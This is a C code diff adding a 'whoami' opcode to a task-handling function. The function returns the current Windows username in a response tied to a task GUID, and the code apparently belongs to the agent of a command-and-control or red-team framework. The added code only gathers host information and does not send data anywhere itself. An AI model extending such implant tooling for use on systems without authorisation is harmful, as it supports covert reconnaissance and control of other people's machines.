@@ -132,9 +132,28 @@ BOOL HandleOpcode(TaskRequest *tr, TaskResponse *tResp) {
 
     tResp->TaskGuid = tr->TaskGuid;
     tResp->Response = bytes_array;
+
     break;
   }
+  case OPCODE_WHOAMI: {
+    char username[MAX_PATH] = {0};
+    DWORD dwSize = MAX_PATH;
 
+    GetUserNameA(username, &dwSize);
+    dwSize--;
+    pb_bytes_array_t *bytes_array =
+        (pb_bytes_array_t *)malloc(PB_BYTES_ARRAY_T_ALLOCSIZE(dwSize));
+
+    if (!bytes_array) {
+      return FALSE;
+    }
+    DEBUG_PRINTF("Opcode: Username %s:%lu\n", username, dwSize);
+    bytes_array->size = (size_t)dwSize;
+    memcpy(bytes_array->bytes, username, (size_t)dwSize);
+    tResp->TaskGuid = tr->TaskGuid;
+    tResp->Response = bytes_array;
+    break;
+  }
   default:
     DEBUG_PRINTF("INVALID Opcode\n");
     return FALSE;
